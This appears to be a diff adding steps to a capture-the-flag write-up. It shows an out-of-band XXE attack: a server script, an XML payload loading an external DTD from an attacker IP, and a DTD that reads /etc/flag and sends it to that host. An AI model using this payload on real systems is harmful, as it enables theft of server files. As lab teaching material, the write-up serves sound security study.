@@ -16,4 +16,23 @@ In the challenge page we will send the payload.
 
 On the server let's open an http server on port 53.
 
+start_server.sh
+```
+echo $(curl -s ifconfig.me/ip)
+systemctl stop systemd-resolved
+php -S 0.0.0.0:53
+```
+payload.xml
+```
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data SYSTEM "http://51.158.67.1:53/file.dtd">
+<data>&send;</data>
+```
+file.dtd
+```
+<!ENTITY % file SYSTEM "file:///etc/flag">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://51.158.67.1:53/?%file;'>">
+%all;
+```
+
 ![](https://github.com/andersongomes001/ctf_scripts/blob/master/Captura%20de%20tela%20de%202019-11-11%2010-42-54.png?raw=true)
